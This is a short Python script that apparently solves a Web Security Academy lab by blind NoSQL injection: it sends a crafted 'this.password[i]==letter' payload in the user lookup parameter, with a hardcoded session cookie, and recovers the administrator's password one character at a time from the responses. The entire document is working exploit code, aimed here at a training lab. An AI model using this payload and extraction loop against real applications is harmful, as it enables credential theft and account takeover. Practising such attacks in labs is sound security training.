import requests #to send http requests
import string #to use the lowercase letters collection
import urllib.parse #to url encode

password = ""

for i in range(8):
    for letter in string.ascii_lowercase:
        payload = urllib.parse.quote_plus(f"' && this.password[{i}]=='{letter}' || 'a'=='b")
        r = requests.get(url="https://0a3d0027036de0b780f13a90000d00bb.web-security-academy.net/user/lookup?user=administrator"+payload,
                         headers={"Cookie": "session=MqkMqmWKuGsgzvUdlT7NpSSMy1eHitwS"})
        
        if(r.status_code==401):
            print("session cookie is invalid")
            exit() 

        if r.status_code == 403:
            print("lab link isn't correct")
            exit()

        if "username" in r.json(): #if the condition is true
            password+=letter
            print(password) 
                 
           
